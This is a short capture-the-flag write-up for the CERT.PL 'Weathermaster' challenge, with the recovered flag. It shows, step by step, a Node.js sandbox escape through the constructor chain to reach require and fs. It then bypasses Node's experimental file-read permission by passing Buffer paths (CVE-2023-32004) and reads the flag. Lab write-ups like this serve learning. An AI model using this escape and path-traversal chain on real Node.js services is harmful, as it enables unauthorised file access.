# [pwn - Weathermaster](https://hack.cert.pl/challenge/weathermaster)

You can execute nodejs code using `! <code>`. 

#### Import `fs`
```js
! const global = this.constructor.constructor("return global;")();
! const require = global.process.mainModule.require;
! const fs = require('fs');
```

#### List files in current dir
```js
! print(fs.readdirSync('.', 'utf-8'))

// output: [ 'core', 'index.js', 'logs', 'run.sh' ]
```

#### Read `run.sh` to get more information
```js
! print(fs.readFileSync('run.sh', 'utf-8'))
```
You can see that it uses `--allow-fs-read` with `--experimental-permission`:
```bash
#!/bin/sh

node --experimental-permission --allow-fs-read="/app/*" /app/index.js
```
The experimental feature has vulnerability [CVE-2023-32004](https://nvd.nist.gov/vuln/detail/CVE-2023-32004).

#### Read the flag
Use Buffer path traversal vulnerability to read the flag:
```js
! const buffer = require('buffer');
! print(fs.readdirSync(buffer.Buffer.from('/app/../'), 'utf-8'))

//  [
//   '.dockerenv', 'app',
//   'bin',        'dev',
//   'etc',        'flag.txt',
//   'home',       'lib',
//   'media',      'mnt',
//   'opt',        'proc',
//   'root',       'run',
//   'sbin',       'srv',
//   'sys',        'tmp',
//   'usr',        'var'
// ]

! print(fs.readFileSync(buffer.Buffer.from('/app/../flag.txt'), 'utf-8'))

// ecsc24{whats_th3_f0recast_f0r_nodejs?}
```

### Flag
```
ecsc24{whats_th3_f0recast_f0r_nodejs?}
```